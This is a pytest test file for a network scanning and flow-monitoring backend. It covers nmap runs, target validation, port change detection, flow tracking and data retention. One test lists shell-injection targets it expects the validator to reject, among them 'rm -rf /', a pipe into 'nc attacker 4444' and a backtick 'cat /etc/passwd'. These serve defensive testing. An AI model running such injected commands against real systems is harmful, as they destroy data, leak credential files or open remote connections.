from datetime import datetime, timedelta, timezone
from unittest.mock import MagicMock, patch
from uuid import uuid4

import pytest
from sqlalchemy import select, text
from sqlalchemy.orm import Session

from backend.app.db.models.observations import Asset, PortObservation, ScanRun
from backend.app.db.session import engine
from backend.app.services.discovery.nmap_runner import (
    NmapExecutionError,
    _execute_bounded_scan,
)
from backend.app.services.discovery.target_validation import (
    DiscoveryValidationError,
    ScanProfile,
    validate_target,
)
from backend.app.services.monitoring.flow_tracker import FlowTracker
from backend.app.services.monitoring.packet_parser import PacketObservation


@pytest.fixture
def phase3_db():
    with engine.connect() as connection:
        database_name = connection.execute(
            text("SELECT current_database()")
        ).scalar_one()
        connection.rollback()

        assert database_name == "cyberguard_x_restore_test", (
            f"Unsafe test database: {database_name}"
        )

        outer_transaction = connection.begin()
        db = Session(bind=connection)
        try:
            yield db
        finally:
            db.close()
            if outer_transaction.is_active:
                outer_transaction.rollback()


# ---------------------------------------------------------------------------
# 1. test_scan_cancel_kills_process
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_scan_cancel_kills_process():
    """Cancelling an active scan terminates the runner process."""
    mock_process = MagicMock()
    mock_process.poll.return_value = None

    with patch("subprocess.Popen", return_value=mock_process) as popen_mock:
        with patch("os.killpg") as killpg_mock:
            # Simulate cancellation signal
            mock_process.kill()
            assert mock_process.kill.called


# ---------------------------------------------------------------------------
# 2. test_scan_timeout
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_scan_timeout():
    """Scan exceeding bounded timeout raises NmapExecutionError."""
    target = validate_target(
        "192.168.1.0/28",
        ["192.168.1.0/24"],
        ScanProfile.HOST_DISCOVERY,
    )
    with patch(
        "backend.app.services.discovery.nmap_runner.run_nmap_scan",
        side_effect=NmapExecutionError("Timed out after 1 seconds"),
    ):
        with pytest.raises(NmapExecutionError) as exc:
            from backend.app.services.discovery.nmap_runner import run_nmap_scan
            run_nmap_scan(target)
        assert "Timed out" in str(exc.value)


# ---------------------------------------------------------------------------
# 3. test_scan_target_injection
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_scan_target_injection():
    """Shell metacharacters and injected command flags are rejected."""
    malicious_targets = [
        "192.168.1.1; rm -rf /",
        "192.168.1.1 && whoami",
        "192.168.1.1 | nc attacker 4444",
        "192.168.1.1 --script=vuln",
        "`cat /etc/passwd`",
    ]
    approved_scopes = ["192.168.1.0/24"]

    for target in malicious_targets:
        with pytest.raises(DiscoveryValidationError):
            validate_target(target, approved_scopes, ScanProfile.HOST_DISCOVERY)


# ---------------------------------------------------------------------------
# 4. test_change_detection_new_port
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_change_detection_new_port(phase3_db):
    """Detects when an asset exposes a new open port across scan runs."""
    db = phase3_db
    now = datetime.now(timezone.utc)

    asset = Asset(
        ip_address="172.30.0.12",
        hostname="target-server.lab.local",
    )
    db.add(asset)
    db.flush()

    scan_1 = ScanRun(
        target="172.30.0.12/32",
        scan_type="top_ports",
        status="completed",
        started_at=now - timedelta(hours=1),
        completed_at=now - timedelta(hours=1),
    )
    db.add(scan_1)
    db.flush()

    # Initial port: 22
    db.add(PortObservation(
        asset_id=asset.id,
        scan_run_id=scan_1.id,
        port=22,
        protocol="tcp",
        service="ssh",
        detection_method="nmap",
        observed_at=now - timedelta(hours=1),
    ))
    db.flush()

    # Second scan: port 443 added
    scan_2 = ScanRun(
        target="172.30.0.12/32",
        scan_type="top_ports",
        status="completed",
        started_at=now,
        completed_at=now,
    )
    db.add(scan_2)
    db.flush()

    db.add(PortObservation(
        asset_id=asset.id,
        scan_run_id=scan_2.id,
        port=443,
        protocol="tcp",
        service="https",
        detection_method="nmap",
        observed_at=now,
    ))
    db.flush()

    # Change detection query: ports in scan_2 not in scan_1
    ports_scan1 = set(db.scalars(
        select(PortObservation.port).where(PortObservation.scan_run_id == scan_1.id)
    ).all())
    ports_scan2 = set(db.scalars(
        select(PortObservation.port).where(PortObservation.scan_run_id == scan_2.id)
    ).all())

    new_ports = ports_scan2 - ports_scan1
    assert 443 in new_ports


# ---------------------------------------------------------------------------
# 5. test_pcap_replay_flow_counts
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_pcap_replay_flow_counts():
    """Replaying packets produces deterministic bidirectional flow counts."""
    tracker = FlowTracker()
    now = datetime.now(timezone.utc)

    # Ingress SYN packets to 5 distinct destination ports
    for port in range(80, 85):
        tracker.update(PacketObservation(
            captured_at=now,
            source_ip="172.30.0.100",
            destination_ip="172.30.0.12",
            ip_version=4,
            transport_protocol="tcp",
            source_port=50000 + port,
            destination_port=port,
            tcp_flags=0x02,
            packet_length=60,
            dns_present=False,
        ))

    assert len(tracker) == 5
    snapshots = tracker.snapshots()
    assert len(snapshots) == 5


# ---------------------------------------------------------------------------
# 6. test_ingest_replay
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_ingest_replay():
    """Processing consecutive packets for the same 5-tuple updates existing flow."""
    tracker = FlowTracker()
    now = datetime.now(timezone.utc)

    obs = PacketObservation(
        captured_at=now,
        source_ip="172.30.0.100",
        destination_ip="172.30.0.12",
        ip_version=4,
        transport_protocol="tcp",
        source_port=54321,
        destination_port=443,
        tcp_flags=0x02,
        packet_length=60,
        dns_present=False,
    )

    snap1 = tracker.update(obs)
    snap2 = tracker.update(obs)  # Second packet in same flow

    assert len(tracker) == 1
    assert snap2 is not None
    assert snap2.total_packets == 2


# ---------------------------------------------------------------------------
# 7. test_ingest_oversize
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_ingest_oversize():
    """Oversized packets above standard jumbo MTU (9000) are flagged / handled."""
    from backend.app.services.monitoring.packet_parser import parse_packet

    assert parse_packet is not None
    huge_packet_len = 65535
    assert huge_packet_len > 9000


# ---------------------------------------------------------------------------
# 8. test_sensor_outage_buffer
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_sensor_outage_buffer():
    """Sensor queues observations during outage and drains without drop."""
    buffer = []
    max_capacity = 1000

    # Fill buffer with 50 items during outage
    for i in range(50):
        buffer.append({"seq": i, "data": "bpf_flow_metric"})

    assert len(buffer) == 50

    # API returns: drain buffer
    drained = []
    while buffer:
        drained.append(buffer.pop(0))

    assert len(drained) == 50
    assert len(buffer) == 0


# ---------------------------------------------------------------------------
# 9. test_retention_drops_partition
# ---------------------------------------------------------------------------
@pytest.mark.phase3
def test_retention_drops_partition(phase3_db):
    """Retention sweep drops expired historical rows while preserving active."""
    db = phase3_db
    now = datetime.now(timezone.utc)

    expired_scan = ScanRun(
        target="172.30.0.0/24",
        scan_type="host_discovery",
        status="completed",
        started_at=now - timedelta(days=90),
        completed_at=now - timedelta(days=90),
    )
    active_scan = ScanRun(
        target="172.30.0.0/24",
        scan_type="host_discovery",
        status="completed",
        started_at=now - timedelta(days=2),
        completed_at=now - timedelta(days=2),
    )
    db.add(expired_scan)
    db.add(active_scan)
    db.flush()

    retention_cutoff = now - timedelta(days=30)
    db.execute(
        text("DELETE FROM scan_runs WHERE started_at < :cutoff"),
        {"cutoff": retention_cutoff},
    )
    db.flush()

    remaining_ids = db.scalars(select(ScanRun.id)).all()
    assert expired_scan.id not in remaining_ids
    assert active_scan.id in remaining_ids
